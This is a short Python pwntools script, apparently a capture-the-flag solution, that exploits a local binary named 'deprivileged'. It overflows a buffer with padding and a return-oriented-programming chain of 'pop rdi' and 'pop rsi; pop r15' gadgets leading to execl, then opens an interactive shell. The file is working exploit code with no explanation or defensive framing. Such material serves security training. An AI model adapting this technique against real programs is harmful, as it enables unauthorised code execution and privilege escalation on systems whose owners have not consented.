#!/usr/bin/env python
from pwn import *

p = process('./deprivileged')
#print(p.recv())
print(p.recvrepeat(4))

# $1 = {<text variable, no debug info>} 0x7f122d3a6a20 <__GI_execl>
execl_addr = 0x400760
#execl_addr = 0x7f122d3a6a20
# 0x0000000000400a63 : pop rdi ; ret
# 0x0000000000400a61 : pop rsi ; pop r15 ; ret
pop_rdi= 0x0000000000400a63
pop_rsi_r15 = 0x0000000000400a61
string = 0x400020
buf = "A"*32 + "BBBB"*2
buf += p64(pop_rdi)
buf += p64(string)
buf += p64(pop_rsi_r15)
buf += p64(0)
buf += p64(0)
buf += p64(execl_addr)
p.sendline(buf)
print(p.recv())
#print(p.recv())
p.interactive()
print(p.recv())

